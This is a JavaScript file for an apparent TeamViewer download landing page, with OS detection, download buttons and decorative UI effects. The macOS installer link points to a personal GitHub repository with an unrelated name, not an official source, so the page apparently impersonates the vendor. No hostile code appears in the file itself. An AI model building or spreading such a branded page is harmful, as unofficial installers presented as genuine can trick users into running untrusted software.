(function () {
    'use strict';

    var ICONS = {
        windows: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>',
        macos: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg>'
    };

    var FILES = {
        windows: {
            href: 'downloads/TeamViewer_Setup_x64.exe',
            label: 'Descargar para Windows'
        },
        macos: {
            href: 'https://github.com/cdxw46/websitepruebasparakimibbva/releases/latest/download/TeamViewer.dmg',
            label: 'Descargar para macOS'
        }
    };

    /* ---------- Detección de sistema operativo ---------- */
    function detectOS() {
        if (/Mac/.test(navigator.platform) || /Mac OS/.test(navigator.userAgent)) return 'macos';
        return 'windows';
    }

    function applyOSDetection() {
        var os = detectOS();
        var other = os === 'macos' ? 'windows' : 'macos';

        var primary = document.getElementById('dl-primary');
        var secondary = document.getElementById('dl-secondary');

        primary.href = FILES[os].href;
        document.getElementById('dl-primary-text').textContent = FILES[os].label;
        document.getElementById('dl-primary-icon').innerHTML = ICONS[os];

        secondary.href = FILES[other].href;
        document.getElementById('dl-secondary-text').textContent = FILES[other].label;
        document.getElementById('dl-secondary-icon').innerHTML = ICONS[other];

        var card = document.querySelector('.card[data-os="' + os + '"]');
        if (card) {
            var badge = card.querySelector('.card__badge');
            if (badge) badge.hidden = false;
        }
    }

    /* ---------- Header con efecto al hacer scroll ---------- */
    function initHeader() {
        var header = document.getElementById('header');
        var onScroll = function () {
            header.classList.toggle('scrolled', window.scrollY > 24);
        };
        window.addEventListener('scroll', onScroll, { passive: true });
        onScroll();
    }

    /* ---------- Luz que sigue al cursor ---------- */
    function initSpotlight() {
        if (window.matchMedia('(hover: none)').matches) return;
        if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;

        var spotlight = document.getElementById('spotlight');
        var raf = null;

        window.addEventListener('mousemove', function (e) {
            if (raf) return;
            raf = requestAnimationFrame(function () {
                spotlight.style.setProperty('--mx', e.clientX + 'px');
                spotlight.style.setProperty('--my', e.clientY + 'px');
                raf = null;
            });
        }, { passive: true });
    }

    /* ---------- Partículas del hero ---------- */
    function initParticles() {
        var canvas = document.getElementById('particles');
        if (!canvas) return;
        if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;

        var ctx = canvas.getContext('2d');
        var particles = [];
        var LINK_DIST = 130;
        var running = true;
        var width, height, dpr;

        function resize() {
            dpr = Math.min(window.devicePixelRatio || 1, 2);
            width = canvas.offsetWidth;
            height = canvas.offsetHeight;
            canvas.width = width * dpr;
            canvas.height = height * dpr;
            ctx.setTransform(dpr, 0, 0, dpr, 0, 0);

            var count = Math.min(Math.floor((width * height) / 16000), 90);
            particles = [];
            for (var i = 0; i < count; i++) {
                particles.push({
                    x: Math.random() * width,
                    y: Math.random() * height,
                    vx: (Math.random() - 0.5) * 0.35,
                    vy: (Math.random() - 0.5) * 0.35,
                    r: Math.random() * 1.6 + 0.6
                });
            }
        }

        function tick() {
            if (!running) return;
            ctx.clearRect(0, 0, width, height);

            for (var i = 0; i < particles.length; i++) {
                var p = particles[i];
                p.x += p.vx;
                p.y += p.vy;

                if (p.x < -10) p.x = width + 10;
                if (p.x > width + 10) p.x = -10;
                if (p.y < -10) p.y = height + 10;
                if (p.y > height + 10) p.y = -10;

                ctx.beginPath();
                ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(45, 204, 205, 0.5)';
                ctx.fill();

                for (var j = i + 1; j < particles.length; j++) {
                    var q = particles[j];
                    var dx = p.x - q.x;
                    var dy = p.y - q.y;
                    var dist = Math.sqrt(dx * dx + dy * dy);

                    if (dist < LINK_DIST) {
                        ctx.beginPath();
                        ctx.moveTo(p.x, p.y);
                        ctx.lineTo(q.x, q.y);
                        ctx.strokeStyle = 'rgba(45, 204, 205, ' + (0.14 * (1 - dist / LINK_DIST)) + ')';
                        ctx.lineWidth = 1;
                        ctx.stroke();
                    }
                }
            }
            requestAnimationFrame(tick);
        }

        var observer = new IntersectionObserver(function (entries) {
            var visible = entries[0].isIntersecting;
            if (visible && !running) {
                running = true;
                tick();
            } else if (!visible) {
                running = false;
            }
        });
        observer.observe(canvas);

        document.addEventListener('visibilitychange', function () {
            if (document.hidden) {
                running = false;
            } else {
                running = true;
                tick();
            }
        });

        window.addEventListener('resize', resize);
        resize();
        tick();
    }

    /* ---------- Aparición de elementos ---------- */
    function initReveal() {
        var elements = document.querySelectorAll('.reveal');
        if (!('IntersectionObserver' in window)) {
            elements.forEach(function (el) { el.classList.add('is-visible'); });
            return;
        }
        var observer = new IntersectionObserver(function (entries) {
            entries.forEach(function (entry) {
                if (entry.isIntersecting) {
                    entry.target.classList.add('is-visible');
                    observer.unobserve(entry.target);
                }
            });
        }, { threshold: 0.12, rootMargin: '0px 0px -40px 0px' });

        elements.forEach(function (el) { observer.observe(el); });
    }

    /* ---------- Contadores animados ---------- */
    function initCounters() {
        var counters = document.querySelectorAll('.counter');
        if (!counters.length) return;

        var observer = new IntersectionObserver(function (entries) {
            entries.forEach(function (entry) {
                if (!entry.isIntersecting) return;
                observer.unobserve(entry.target);

                var el = entry.target;
                var target = parseInt(el.dataset.target, 10);
                var duration = 1400;
                var start = null;

                function step(timestamp) {
                    if (!start) start = timestamp;
                    var progress = Math.min((timestamp - start) / duration, 1);
                    var eased = 1 - Math.pow(1 - progress, 3);
                    el.textContent = Math.round(eased * target);
                    if (progress < 1) requestAnimationFrame(step);
                }
                requestAnimationFrame(step);
            });
        }, { threshold: 0.5 });

        counters.forEach(function (el) { observer.observe(el); });
    }

    /* ---------- Efecto 3D en el mockup ---------- */
    function initTilt() {
        var wrapper = document.getElementById('tilt');
        var card = document.getElementById('tilt-card');
        if (!wrapper || !card) return;
        if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
        if (window.matchMedia('(hover: none)').matches) return;

        var MAX = 7;

        wrapper.addEventListener('mousemove', function (e) {
            var rect = wrapper.getBoundingClientRect();
            var x = (e.clientX - rect.left) / rect.width - 0.5;
            var y = (e.clientY - rect.top) / rect.height - 0.5;
            card.style.transform = 'rotateY(' + (x * MAX) + 'deg) rotateX(' + (-y * MAX) + 'deg)';
        });

        wrapper.addEventListener('mouseleave', function () {
            card.style.transform = 'rotateY(0deg) rotateX(0deg)';
        });
    }

    /* ---------- FAQ: solo una abierta ---------- */
    function initFaq() {
        var items = document.querySelectorAll('.faq__item');
        items.forEach(function (item) {
            item.addEventListener('toggle', function () {
                if (item.open) {
                    items.forEach(function (other) {
                        if (other !== item) other.open = false;
                    });
                }
            });
        });
    }

    /* ---------- Botón volver arriba ---------- */
    function initToTop() {
        var button = document.getElementById('to-top');
        window.addEventListener('scroll', function () {
            button.classList.toggle('visible', window.scrollY > 600);
        }, { passive: true });
        button.addEventListener('click', function () {
            window.scrollTo({ top: 0, behavior: 'smooth' });
        });
    }

    function initYear() {
        var el = document.getElementById('year');
        if (el) el.textContent = new Date().getFullYear();
    }

    document.addEventListener('DOMContentLoaded', function () {
        applyOSDetection();
        initHeader();
        initSpotlight();
        initParticles();
        initReveal();
        initCounters();
        initTilt();
        initFaq();
        initToTop();
        initYear();
    });
})();
